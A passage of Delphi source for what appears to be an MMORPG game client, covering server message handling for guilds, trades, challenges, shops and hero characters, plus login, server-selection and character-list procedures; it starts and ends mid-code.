          SM_GROUPMEMBERS:
          Begin
            ClientGetGroupMembers(DecodeString(Body));
          End;

          SM_OPENGUILDDLG:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            ClientGetOpenGuildDlg(body);
          End;

          SM_SENDGUILDMEMBERLIST:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            ClientGetSendGuildMemberList(body);
          End;

          SM_OPENGUILDDLG_FAIL:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            FrmDlg.DMessageDlg('你目前没有加入任何行会！', [mbOk]);
          End;

          SM_DEALTRY_FAIL:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            FrmDlg.DMessageDlg('交易被取消.\要正确交易您必须和对方面对面.', [mbOk]);
          End;
          SM_DEALMENU:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            g_sDealWho := DecodeString(body);
            FrmDlg.OpenDealDlg;
          End;
          SM_DEALCANCEL:
          Begin
            MoveDealItemToBag;
            If g_DealDlgItem.S.Name <> '' Then
            Begin
              AddItemBag(g_DealDlgItem); //啊规俊 眠啊
              g_DealDlgItem.S.Name := '';
            End;
            If g_nDealGold > 0 Then
            Begin
              g_MySelf.m_nGold := g_MySelf.m_nGold + g_nDealGold;
              g_nDealGold := 0;
            End;
            FrmDlg.CloseDealDlg;
          End;
          SM_ChallengeMENU://申请挑战成功
          begin
            FrmDlg.OpenChallengeDlg;
            g_nChallengeGoldIndex:=byte(msg.Recog);
            g_nChallengeRemoteChName:=DecodeString(Body);
          end;
          SM_CancelChallege: //取消挑战
          begin
            MoveChallengeToBag;//把挑战物品放回包裹
            If g_nChallengeGold > 0 Then
            Begin
              g_MySelf.m_nGold := g_MySelf.m_nGold + g_nChallengeGold;
              g_nChallengeGold := 0;
            End;
            If g_nChallengeGameDiamond > 0 Then
            case g_nChallengeGoldIndex of
            0:
              begin
               g_MySelf.m_nGameDiamond := g_MySelf.m_nGameDiamond + g_nChallengeGameDiamond;
               g_nChallengeGameDiamond := 0;
              end;
            1:
              begin
               g_MySelf.m_nGameGold := g_MySelf.m_nGameGold + g_nChallengeGameDiamond;
               g_nChallengeGameDiamond := 0;
              end;
            2:
              begin
               g_MySelf.m_nGameGird:=g_MySelf.m_nGameGird + g_nChallengeGameDiamond;
               g_nChallengeGameDiamond := 0;
              end;
            end;
            FrmDlg.DWChallenge.Visible:=False;
          end;
          SM_ChallengeGoldFail://更改挑战抵押金币失败
          Begin
            g_nChallengeGold := msg.Recog;
            g_MySelf.m_nGold := MakeLong(msg.param, msg.tag);
          End;
          SM_ChallengeGameDiamondFail://更改挑战抵押金刚石失败
          Begin
            case g_nChallengeGoldIndex of
            0:
             begin
              g_nChallengeGameDiamond:=msg.Recog;
              g_MySelf.m_nGameDiamond:=MakeLong(msg.param, msg.tag);
             end;
            1:
             begin
              g_nChallengeGameDiamond:=msg.Recog;
              g_MySelf.m_nGameGold:=MakeLong(msg.param, msg.tag);
             end;
            2:
             begin
              g_nChallengeGameDiamond:=msg.Recog;
              g_MySelf.m_nGameGird:=MakeLong(msg.param, msg.tag);
             end;
            end;
          End;
          SM_RemoteChallengeGold://更改对方挑战抵押金币
          begin
            g_nChallengeRemoteGold:=msg.Recog;
          end;
          SM_RemoteChallengeGameDiamond://更改对方挑战抵押金刚石
          begin
             g_nChallengeRemoteGameDiamond:=msg.Recog;
          end;
          SM_DelChallengeItemFail://删除挑战抵押物品失败
          begin
            If (g_ChallengeWaitItem.S.Name <> '') and (g_ChallengeWaitItem.MakeIndex=msg.Recog) Then
            Begin
              DelItemBag(g_ChallengeWaitItem.S.Name, g_ChallengeWaitItem.MakeIndex);
              g_ChallengeItems1[msg.param]:=g_ChallengeWaitItem;
              g_ChallengeWaitItem.S.Name := '';
            End;
          end;
          SM_ADDChallengeItemFail://添加挑战抵押物品失败
          begin
            If (g_ChallengeWaitItem.S.Name <> '') and (g_ChallengeWaitItem.MakeIndex=msg.Recog) Then
            Begin
              ADDItemBag(g_ChallengeWaitItem);
              g_ChallengeItems1[msg.param].S.Name:='';
              g_ChallengeWaitItem.S.Name := '';
            End;
          end;
         SM_ADDChallengeItemOK://添加抵挑战抵押物品成功
          begin
            If g_ChallengeWaitItem.S.Name <> '' Then
              g_ChallengeWaitItem.S.Name := '';
          end;
          SM_DelChallengeItemOK://删除挑战抵押物品成功
          begin
            If g_ChallengeWaitItem.S.Name <> '' Then
              g_ChallengeWaitItem.S.Name := '';
          end;
         SM_ADDRemoteChallengeItem://添加对方挑战抵押物品
         begin
          ClientGetChallenegAddItem(body,msg.param);
         end;
         SM_DelRemoteChallengeItem://删除对方挑战抵押物品
         begin
           ClientGetChallengeDelItem(body,msg.param);
         end;
         SM_RemoteChallengeEnd://对方确认了抵押
         begin
           g_boChallengeEnd:=TRUE;
         end;
         SM_ChallengeStart://开始挑战关闭窗口
         begin
          FrmDlg.DWChallenge.Visible:=False;
         end;
          SM_DEALADDITEM_OK:
          Begin
            g_dwDealActionTick := GetTickCount;
            If g_DealDlgItem.S.Name <> '' Then
            Begin
              AddDealItem(g_DealDlgItem); //Deal Dlg俊 眠啊
              g_DealDlgItem.S.Name := '';
            End;
          End;
          SM_DEALADDITEM_FAIL:
          Begin
            g_dwDealActionTick := GetTickCount;
            If g_DealDlgItem.S.Name <> '' Then
            Begin
              AddItemBag(g_DealDlgItem); //啊规俊 眠啊
              g_DealDlgItem.S.Name := '';
            End;
          End;
          SM_DEALDELITEM_OK:
          Begin
            g_dwDealActionTick := GetTickCount;
            If g_DealDlgItem.S.Name <> '' Then
            Begin
              //AddItemBag (DealDlgItem);  //啊规俊 眠啊
              g_DealDlgItem.S.Name := '';
            End;
          End;
          SM_DEALDELITEM_FAIL:
          Begin
            g_dwDealActionTick := GetTickCount;
            If g_DealDlgItem.S.Name <> '' Then
            Begin
              DelItemBag(g_DealDlgItem.S.Name, g_DealDlgItem.MakeIndex);
              AddDealItem(g_DealDlgItem);
              g_DealDlgItem.S.Name := '';
            End;
          End;
          SM_DEALREMOTEADDITEM: ClientGetDealRemoteAddItem(body);
          SM_DEALREMOTEDELITEM: ClientGetDealRemoteDelItem(body);
          SM_DEALCHGGOLD_OK:
          Begin
            g_nDealGold := msg.Recog;
            g_MySelf.m_nGold := MakeLong(msg.param, msg.tag);
            g_dwDealActionTick := GetTickCount;
          End;
          SM_DEALCHGGOLD_FAIL:
          Begin
            g_nDealGold := msg.Recog;
            g_MySelf.m_nGold := MakeLong(msg.param, msg.tag);
            g_dwDealActionTick := GetTickCount;
          End;
          SM_DEALREMOTECHGGOLD:
          Begin
            g_nDealRemoteGold := msg.Recog;
            SoundUtil.PlaySound(s_money);
            //惑措规捞 捣阑 函版茄 版快 家府啊 抄促.
          End;
          SM_DEALSUCCESS:
          Begin
            FrmDlg.CloseDealDlg;
          End;
          SM_SENDUSERSTORAGEITEM:
          Begin
            ClientGetSendUserStorage(msg.Recog);
          End;
          SM_PLAYDRINKSELL:
          Begin
            ClientGetSendPlayDrink(msg.Recog);
          End;
          SM_READMINIMAP_OK:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            ClientGetReadMiniMap(msg.Param, msg.Recog);
          End;
          SM_READMINIMAP_FAIL:
          Begin
            g_dwQueryMsgTick := GetTickCount;
            DScreen.AddHitMsg('没有可用地图。');
            g_nMiniMapIndex := -1;
          End;
          SM_CHANGEGUILDNAME:
          Begin
            ClientGetChangeGuildName(DecodeString(body));
          End;
          SM_SENDUSERSTATE:
          Begin
            ClientGetSendUserState(body);
          End;
          SM_GUILDADDMEMBER_OK:
          Begin
            SendGuildMemberList;
          End;
          SM_GUILDADDMEMBER_FAIL:
          Begin
            Case msg.Recog Of
              1: FrmDlg.DMessageDlg('你没有权力使用这个命令.',
                  [mbOk]);
              2:
                FrmDlg.DMessageDlg('想加入进来的成员应该面对掌门人.', [mbOk]);
              3: FrmDlg.DMessageDlg('他已加入我们行会.', [mbOk]);
              4: FrmDlg.DMessageDlg('已经加入其它行会.', [mbOk]);
              5: FrmDlg.DMessageDlg('对方不允许加入行会.', [mbOk]);
              6:
                FrmDlg.DMessageDlg('你的行会成员人数已达最高上限.',
                  [mbOk]);
            End;
          End;
          SM_GUILDDELMEMBER_OK:
          Begin
            SendGuildMemberList;
          End;
          SM_GUILDDELMEMBER_FAIL:
          Begin
            Case msg.Recog Of
              1: FrmDlg.DMessageDlg('你没有权力使用这个命令.',
                  [mbOk]);
              2: FrmDlg.DMessageDlg('不是我们的行会成员！', [mbOk]);
              3: FrmDlg.DMessageDlg('行会掌门人不能删除他自己！',
                  [mbOk]);
              4: FrmDlg.DMessageDlg('不能使用命令.', [mbOk]);
            End;
          End;
          SM_GUILDRANKUPDATE_FAIL:
          Begin
            Case msg.Recog Of
              -2:
                FrmDlg.DMessageDlg('[任命错误] 掌门人位置是空的。',
                  [mbOk]);
              -3:
                FrmDlg.DMessageDlg('[任命错误] 掌门人职位是空的。',
                  [mbOk]);
              -4:
                FrmDlg.DMessageDlg('[任命错误] 一个行会最多只能有2个掌门人。', [mbOk]);
              -5:
                FrmDlg.DMessageDlg('[任命错误] 新的掌门人已经被传位。', [mbOk]);
              -6:
                FrmDlg.DMessageDlg('[任命错误] 不能添加成员/删除成员。', [mbOk]);
              -7:
                FrmDlg.DMessageDlg('[任命错误] 职位重复或者出错。',
                  [mbOk]);
            End;
          End;
          SM_GUILDMAKEALLY_OK,
            SM_GUILDMAKEALLY_FAIL:
          Begin
            Case msg.Recog Of
              -1: FrmDlg.DMessageDlg('你没有权力！', [mbOk]);
              -2: FrmDlg.DMessageDlg('联盟失败！', [mbOk]);
              -3:
                FrmDlg.DMessageDlg('你应该面对你想要联盟的行会掌门人！', [mbOk]);
              -4: FrmDlg.DMessageDlg('对方行会掌门人不允许结盟！',
                  [mbOk]);
            End;
          End;
          SM_GUILDBREAKALLY_OK,
            SM_GUILDBREAKALLY_FAIL:
          Begin
            Case msg.Recog Of
              -1: FrmDlg.DMessageDlg('你没有权力！', [mbOk]);
              -2: FrmDlg.DMessageDlg('你不在行会联盟中！', [mbOk]);
              -3: FrmDlg.DMessageDlg('这不是一个现有的行会！',
                  [mbOk]);
            End;
          End;
          SM_BUILDGUILD_OK:
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
            FrmDlg.DMessageDlg('行会正确建立.', [mbOk]);
          End;
          SM_BUILDGUILD_FAIL:
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
            Case msg.Recog Of
              -1: FrmDlg.DMessageDlg('已经加入行会。', [mbOk]);
              -2: FrmDlg.DMessageDlg('缺少创建费用。', [mbOk]);
              -3:
                FrmDlg.DMessageDlg('你没有准备好需要的全部物品。',
                  [mbOk]);
            Else
              FrmDlg.DMessageDlg('创建行会失败！！！', [mbOk]);
            End;
          End;
          SM_MENU_OK:
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
            If body <> '' Then
              FrmDlg.DMessageDlg(DecodeString(body), [mbOk]);
          End;
          SM_DLGMSG:
          Begin
            If body <> '' Then
              FrmDlg.DMessageDlg(DecodeString(body), [mbOk]);
          End;
          SM_DONATE_OK:
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
          End;
          SM_DONATE_FAIL:
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
          End;

          SM_PLAYDICE:
          Begin
            Body2 := Copy(Body, GetCodeMsgSize(sizeof(TMessageBodyWL) * 4 / 3) +
              1, Length(body));
            DecodeBuffer(body, @wl, SizeOf(TMessageBodyWL));
            data := DecodeString(Body2);
            FrmDlg.m_nDiceCount := Msg.Param; //QuestActionInfo.nParam1
            FrmDlg.m_Dice[0].nDicePoint := LoByte(LoWord(Wl.lParam1));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[1].nDicePoint := HiByte(LoWord(Wl.lParam1));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[2].nDicePoint := LoByte(HiWord(Wl.lParam1));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[3].nDicePoint := HiByte(HiWord(Wl.lParam1));
            //UserHuman.m_DyVal[0]

            FrmDlg.m_Dice[4].nDicePoint := LoByte(LoWord(Wl.lParam2));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[5].nDicePoint := HiByte(LoWord(Wl.lParam2));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[6].nDicePoint := LoByte(HiWord(Wl.lParam2));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[7].nDicePoint := HiByte(HiWord(Wl.lParam2));
            //UserHuman.m_DyVal[0]

            FrmDlg.m_Dice[8].nDicePoint := LoByte(LoWord(Wl.lTag1));
            //UserHuman.m_DyVal[0]
            FrmDlg.m_Dice[9].nDicePoint := HiByte(LoWord(Wl.lTag1));
            //UserHuman.m_DyVal[0]
            FrmDlg.DialogSize := 0;
            FrmDlg.DMessageDlg('', []);
            SendMerchantDlgSelect(Msg.Recog, data);
          End;

          SM_NEEDPASSWORD:
          Begin
            ClientGetNeedPassword(Body);
          End;
          SM_PASSWORDSTATUS:
          Begin
            ClientGetPasswordStatus(@Msg, Body);
          End;
          SM_GETREGINFO: ClientGetRegInfo(@Msg, Body);
          SM_SHOPTOP,
            SM_SHOPLIST: ClientShopList(Body);
          SM_SHOPERROR:
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
            Case msg.Recog Of
              0:
                FrmDlg.DMessageDlg('[失败]：你所购买的物品不存在商铺当中。', [mbOk]);
              -1:
                FrmDlg.DMessageDlg('[失败]：你所购买的物品不存在商铺当中。', [mbOk]);
              -2: FrmDlg.DMessageDlg('[失败]：你帐号中的' +
                  g_sGameGoldName + '已不足。', [mbOk]);
              -3: FrmDlg.DMessageDlg('[失败]：你帐号中的' +
                  g_sGameGoldName + '已不足。', [mbOk]);
              -4:
                FrmDlg.DMessageDlg('[失败]：你已经无法携带更多的物品。', [mbOk]);
              -5:
                FrmDlg.DMessageDlg('[失败]：你所购买的物品不存在商铺当中。', [mbOk]);
              -20:
                FrmDlg.DMessageDlg('[失败]：你所赠送的玩家不在线。',
                  [mbOk]);
              -24:
                FrmDlg.DMessageDlg('[失败]：你所赠送的玩家背包空间不够。', [mbOk]);
            Else
              FrmDlg.DMessageDlg('[失败]：你的购买速度太快。',
                [mbOk]);
            End;
          End;
          SM_817:
          Begin
            AddItemHeroBag(g_WaitingUseItem.Item);
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_818:
          Begin
            Case msg.Recog Of
              -2: AddItemBag(g_WaitingUseItem.Item);
              -3: AddItemHeroBag(g_WaitingUseItem.Item);
            End;
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_819:
          Begin
            AddItemBag(g_WaitingUseItem.Item);
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_896:
          Begin
            g_MySelf.SendMsg(msg.Ident, msg.Param, msg.Tag, msg.Series, 0, 0,
              '', 0);
            If Assigned(FormWgMain) Then
              FormWgMain.RefHeroState(False, 0);
          End;
          SM_897: g_MySelf.SendMsg(msg.Ident, msg.Param, msg.Tag, msg.Series, 0,
            0, '', 0);
          SM_898:
          Begin
            If g_HeronRecogId <> 0 Then
              g_HerosUserName := DecodeString(Body);
          End;
          SM_899:
          Begin
            DecodeBuffer(body, @hwl, sizeof(THeroCharDesc));
            //PlayScene.SendMsg (msg.Ident,msg.Recog,msg.Param, msg.Tag,msg.Series,wl.lParam1,wl.lParam2, '');
            PlayScene.SendMsg(msg.Ident, msg.Recog, msg.Param, msg.Tag,
              msg.Series, hwl.Feature, hwl.Status, '');
            g_HeronRecogId := msg.Recog;
            g_HerobtSex := hwl.m_btSex;
            g_HerobtJob := hwl.m_btJob;
            g_HeroGloryPoint := hwl.Not1;
            FrmDlg.DHeroDlg.Visible := True;
            SendHeroMinHPTail(Integer(g_WgInfo.wHeroMinHPTail));
          End;
          SM_900:
          Begin
            g_HerobtJob := msg.Param;
            DecodeBuffer(body, @g_HeroAbil, sizeof(TAbility));
            If Assigned(FormWgMain) Then
              FormWgMain.RefHeroState(True, g_HerobtJob);
            If Not g_boSendHeroCall Then
            Begin
              g_boSendHeroCall := True;
              If g_HerobtJob = 1 Then
                SendHeroFun(Integer(g_WgInfo.boHeroAutoMagic), 0);
              If g_HerobtJob = 2 Then
                SendHeroMob();
              //SendHeroFun(Integer((g_WgInfo.btHeroCallMobClass in [0..2])),0);
              //SendHeroMob(g_WgInfo.btHeroCallMobClass);
            //end;
            End;
          End;
          SM_901:
          Begin
            g_nHeroHitPoint := Lobyte(Msg.Param);
            g_nHeroSpeedPoint := Hibyte(Msg.Param);
            g_nHeroAntiPoison := Lobyte(Msg.Tag);
            g_nHeroPoisonRecover := Hibyte(Msg.Tag);
            g_nHeroHealthRecover := Lobyte(Msg.Series);
            g_nHeroSpellRecover := Hibyte(Msg.Series);
            g_nHeroAntiMagic := LoByte(LongWord(Msg.Recog));
          End;
          SM_902: ClientGetHeroBagItmes(Body);
          SM_903: ClientGetSendHeroItems(Body);
          SM_904: ClientGetHeroMagics(Body);
          SM_905: ClientGetHeroAddItem(Body,msg.Param);
          SM_906: ClientGetHeroDelItem(Body);
          SM_907:
          Begin
            If g_WaitingUseItem.Index In [0..MAXUSEITEMS] Then
              g_HeroUseItems[g_WaitingUseItem.Index] := g_WaitingUseItem.Item;
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_PLAYDRINK: ClientGetPlayDrink(msg, body);
          SM_908:
          Begin
            AddItemHeroBag(g_WaitingUseItem.Item);
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_909:
          Begin
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_910:
          Begin
            If g_WaitingUseItem.Index < 0 Then
            Begin
              n := -(g_WaitingUseItem.Index + 1);
              g_HeroUseItems[n] := g_WaitingUseItem.Item;
            End;
            g_WaitingUseItem.Item.S.Name := '';
          End;
          SM_911:
          Begin
            g_HeroEatingItem.S.Name := '';
            ArrangeItemHerobag;
          End;
          SM_912:
          Begin
            AddItemHeroBag(g_HeroEatingItem);
            g_HeroEatingItem.S.Name := '';
          End;
          SM_914:
          Begin
            g_HeroAbil.Level := msg.Param;
            DScreen.AddSysMsg('英雄升级了.');
          End;
          SM_915:
          Begin
            g_HeroAbil.Exp := msg.Recog;
            //经验显示选择
          if (not g_WgInfo.boExpShowFil) or (g_WgInfo.boExpShowFil and (MakeLong(msg.Param, msg.Tag)>2000)) then
            If g_ExpShowConfig Then
              DScreen.AddChatBoardString(IntToStr(LongWord(MakeLong(msg.Param,
                msg.Tag))) + ' 点经验值英雄增加.', clWhite, clRed)
            Else
              DScreen.AddHitMsg(IntToStr(LongWord(MakeLong(msg.Param, msg.Tag)))
                + ' 点经验值英雄增加.');
          End;
          SM_916: ClientGetHeroMagicLvExp(msg.Recog, msg.Param,
            MakeLong(msg.Tag, msg.Series));
          SM_917: ClientGetHeroBagCount(msg.Param);
          SM_918: ClientGetCloseHero;
          SM_919: ClientGetHeroDuraChange(msg.Param {useitem index}, msg.Recog,
            MakeLong(msg.Tag, msg.Series));
          SM_920: DelDropItem(DecodeString(body), msg.Recog);
          SM_921: ClientGetHeroDropItemFail(DecodeString(body), msg.Recog);
          SM_922: ClientGetHeroBabDuraChange(msg.Recog, msg.Param, msg.Tag);
          SM_923:
          Begin
            g_HeroDander := msg.Recog;
            If msg.Param = 1 Then
              g_HeroDanderOk := True
            Else
              g_HeroDanderOk := False;
            //g_HeroDanderMax:=msg.Tag
          End;
          SM_924: ClientGetHeroAddMagic(body);
          SM_925: ClientGetHeroDelMagic(msg.Recog);
          SM_ATTACKMODE: g_ArrackMode := DecodeString(body);
          SM_PLAYSHOP_OK:
          Begin
            AddItemBag(g_SelfShopItem);
            DelShopItem(g_SelfShopItem.MakeIndex, g_SelfShopItem.S.Name);
            g_SelfShopItem.S.Name := '';
            FrmDlg.DlgShopItem.Item.S.Name := '';
            ArrangeItemBag;
          End;
          SM_PLAYSHOP_FALL:
          Begin
            g_SelfShopItem.S.Name := '';
            Case msg.Recog Of
              1:
                FrmDlg.DMessageDlg('[失败]：你所购买的物品已经被卖出去！', [mbOk]);
              2: FrmDlg.DMessageDlg('[失败]：你的金币或' +
                  g_sGameGoldName + '不够，或者卖家不能携带更多的金币或'
                  + g_sGameGoldName + '！', [mbOk]);
              3:
                FrmDlg.DMessageDlg('[失败]：你无法携带更多的物品！',
                  [mbOk]);
            Else
              FrmDlg.DMessageDlg('[失败]：未知的错误！', [mbOk]);
            End;
          End;
          SM_DELSHOPITEM: DelShopItemEx(msg.Recog);
          SM_OPENBOOKS: ClientGetBooks(msg.Recog);
          SM_CHANGEDRAGON:
          Begin
            g_nDragonMax := msg.Recog;
            g_nDragonCount := MakeLong(msg.Param, msg.Tag);
          End;
          SM_HEROCHANGEGLORY: g_HeroGloryPoint := msg.Series;
          SM_GETADDRESS: ClientGetAddress(msg.Recog, DecodeString(body));
          SM_SENDDATA: ClientGetCheckData(DecodeString(body));
          SM_CONNECT: ClientGetCheckConnect(msg.Recog, DecodeString(body));
          {dmsg := MakeDefaultMsg (CM_SENDDATA,0,0,0,0);
          SendSocket (EncodeMessage (dmsg) + EncodeString(Socket.ReceiveText)); }
    //消息结尾
    Else
      Begin
        If g_MySelf = Nil Then
          exit; //Jacky 在未进入游戏时不处理下面
        //Jacky
        //            DScreen.AddSysMsg (IntToStr(msg.Ident) + ' : ' + body);
        PlayScene.MemoLog.Lines.Add('Ident: ' + IntToStr(msg.Ident));
        PlayScene.MemoLog.Lines.Add('Recog: ' + IntToStr(msg.Recog));
        PlayScene.MemoLog.Lines.Add('Param: ' + IntToStr(msg.Param));
        PlayScene.MemoLog.Lines.Add('Tag: ' + IntToStr(msg.Tag));
        PlayScene.MemoLog.Lines.Add('Series: ' + IntToStr(msg.Series));
      End;
    End;

    If Pos('#', datablock) > 0 Then
      DScreen.AddSysMsg(datablock);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DecodeMessagePacket'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetPasswdSuccess(body: String);
Var
  str, runaddr, runport, {uid,} certifystr: String;
Begin
  Try //程序自动增加
    str := DecodeString(body);
    str := GetValidStr3(str, runaddr, ['/']);
    str := GetValidStr3(str, runport, ['/']);
    str := GetValidStr3(str, certifystr, ['/']);
    Certification := Str_ToInt(certifystr, 0);

    If Not BoOneClick Then
    Begin
      CSocket.Active := False;
      CSocket.Host := '';
      CSocket.Port := 0;
      FrmDlg.DSelServerDlg.Visible := FALSE;
      WaitAndPass(500); //0.5檬悼救 扁促覆
      g_ConnectionStep := cnsSelChr;
      With CSocket Do
      Begin
        g_sSelChrAddr := runaddr;
        g_nSelChrPort := Str_ToInt(runport, 0);
        Address := g_sSelChrAddr;
        Port := g_nSelChrPort;
        Active := TRUE;
      End;
    End
    Else
    Begin
      FrmDlg.DSelServerDlg.Visible := FALSE;
      g_sSelChrAddr := runaddr;
      g_nSelChrPort := Str_ToInt(runport, 0);
      If CSocket.Socket.Connected Then
        CSocket.Socket.SendText('$S' + runaddr + '/' + runport + '%');
      WaitAndPass(500); //0.5檬悼救 扁促覆
      g_ConnectionStep := cnsSelChr;
      LoginScene.OpenLoginDoor;
      SelChrWaitTimer.Enabled := TRUE;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetPasswdSuccess');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetPasswordOK(Msg: TDefaultMessage;
  sBody: String);
Var
  I: Integer;
  sServerName: String;
  sServerStatus: String;
  nCount: Integer;
Begin
  Try //程序自动增加
    sBody := DeCodeString(sBody);
    nCount := _MIN(6, msg.Series);
    g_ServerList.Clear;
    For I := 0 To nCount - 1 Do
    Begin
      sBody := GetValidStr3(sBody, sServerName, ['/']);
      sBody := GetValidStr3(sBody, sServerStatus, ['/']);
      g_ServerList.AddObject(sServerName, TObject(Str_ToInt(sServerStatus, 0)));
    End;

    g_wAvailIDDay := Loword(msg.Recog);
    g_wAvailIDHour := Hiword(msg.Recog);
    g_wAvailIPDay := msg.Param;
    g_wAvailIPHour := msg.Tag;

    If g_wAvailIDDay > 0 Then
    Begin
      If g_wAvailIDDay = 1 Then
        FrmDlg.DMessageDlg('您当前ID费用到今天为止。', [mbOk])
      Else If g_wAvailIDDay <= 3 Then
        FrmDlg.DMessageDlg('您当前IP费用还剩 ' + IntToStr(g_wAvailIDDay)
          +
          ' 天。', [mbOk]);
    End
    Else If g_wAvailIPDay > 0 Then
    Begin
      If g_wAvailIPDay = 1 Then
        FrmDlg.DMessageDlg('您当前IP费用到今天为止。', [mbOk])
      Else If g_wAvailIPDay <= 3 Then
        FrmDlg.DMessageDlg('您当前IP费用还剩 ' + IntToStr(g_wAvailIPDay)
          +
          ' 天。', [mbOk]);
    End
    Else If g_wAvailIPHour > 0 Then
    Begin
      If g_wAvailIPHour <= 100 Then
        FrmDlg.DMessageDlg('您当前IP费用还剩 ' + IntToStr(g_wAvailIPHour)
          + ' 小时。', [mbOk]);
    End
    Else If g_wAvailIDHour > 0 Then
    Begin
      FrmDlg.DMessageDlg('您当前ID费用还剩 ' + IntToStr(g_wAvailIDHour) +
        ' 小时。', [mbOk]);
      ;
    End;

    If Not LoginScene.m_boUpdateAccountMode Then
      ClientGetSelectServer;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetPasswordOK'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSelectServer;
//var
//  sname: string;
Begin
  Try //程序自动增加
    LoginScene.HideLoginBox;
    FrmDlg.ShowSelectServerDlg;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSelectServer');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetNeedUpdateAccount(body: String);
Var
  ue: TUserEntry;
Begin
  Try //程序自动增加
    DecodeBuffer(body, @ue, sizeof(TUserEntry));
    LoginScene.UpdateAccountInfos(ue);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetNeedUpdateAccount');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetRenewHum(Msg: pTDefaultMessage; Body: String);
Var
  I: integer;
  str, uname, sjob, shair, slevel, ssex: String;
Begin
  Try //程序自动增加
    If Msg.Recog > 0 Then
    Begin
      With SelectChrScene Do
      Begin
        FillChar(RenewChr, SizeOf(TUserCharacterInfo) * (High(RenewChr) + 1),
          #0);
        str := DecodeString(body);
        For I := 0 To Msg.Recog - 1 Do
        Begin
          If I >= High(RenewChr) Then
            break;
          str := GetValidStr3(str, uname, ['/']);
          str := GetValidStr3(str, sjob, ['/']);
          str := GetValidStr3(str, shair, ['/']);
          str := GetValidStr3(str, slevel, ['/']);
          str := GetValidStr3(str, ssex, ['/']);
          If (uname <> '') And (slevel <> '') And (ssex <> '') Then
          Begin
            RenewChr[I].Name := uname;
            RenewChr[I].Job := Str_ToInt(sJob, 0);
            RenewChr[I].Hair := Str_ToInt(shair, 0);
            RenewChr[I].Level := Str_ToInt(sLevel, 0);
            RenewChr[I].Sex := Str_ToInt(ssex, 0);
          End;
          FrmDlg.DRenewChr.Left := 30;
          FrmDlg.DRenewChr.Top := 0;
          FrmDlg.DRenewChr.Visible := True;
        End;
      End;
    End
    Else
      FrmDlg.DMessageDlg('[失败] 没有找到被删除的角色。', [mbOK])
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetRenewHum'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetReceiveChrs(body: String);
Var
  i, select: integer;
  str, uname, sjob, shair, slevel, ssex: String;
Begin
  Try //程序自动增加
    SelectChrScene.ClearChrs;
    str := DecodeString(body);
    For i := 0 To 1 Do
    Begin
      str := GetValidStr3(str, uname, ['/']);
      str := GetValidStr3(str, sjob, ['/']);
      str := GetValidStr3(str, shair, ['/']);
      str := GetValidStr3(str, slevel, ['/']);
      str := GetValidStr3(str, ssex, ['/']);
      select := 0;
      If (uname <> '') And (slevel <> '') And (ssex <> '') Then
      Begin
        If uname[1] = '*' Then
        Begin
          select := i;
          uname := Copy(uname, 2, Length(uname) - 1);
        End;
        SelectChrScene.AddChr(uname, Str_ToInt(sjob, 0), Str_ToInt(shair, 0),
          Str_ToInt(slevel, 0), Str_ToInt(ssex, 0));
      End;
      With SelectChrScene Do
      Begin
        If select = 0 Then
        Begin
          ChrArr[0].FreezeState := FALSE;
          ChrArr[0].Selected := TRUE;
          ChrArr[1].FreezeState := TRUE;
          ChrArr[1].Selected := FALSE;
        End
        Else
        Begin
          ChrArr[0].FreezeState := TRUE;
          ChrArr[0].Selected := FALSE;
          ChrArr[1].FreezeState := FALSE;
          ChrArr[1].Selected := TRUE;
        End;
      End;
    End;
    PlayScene.EdAccountt.Text := LoginId;
    //2004/05/17  强行登录
    {
    if SelectChrScene.ChrArr[0].Valid and SelectChrScene.ChrArr[0].Selected then PlayScene.EdChrNamet.Text := SelectChrScene.ChrArr[0].UserChr.Name;
    if SelectChrScene.ChrArr[1].Valid and SelectChrScene.ChrArr[1].Selected then PlayScene.EdChrNamet.Text := SelectChrScene.ChrArr[1].UserChr.Name;
    PlayScene.EdAccountt.Visible:=True;
    PlayScene.EdChrNamet.Visible:=True;
    }
    //2004/05/17
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetReceiveChrs');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetStartPlay(body: String);
Var
  str, addr, sport: String;
Begin
  Try //程序自动增加
    str := DecodeString(body);
    sport := GetValidStr3(str, g_sRunServerAddr, ['/']);
    g_nRunServerPort := Str_ToInt(sport, 0);

    If Not BoOneClick Then
    Begin
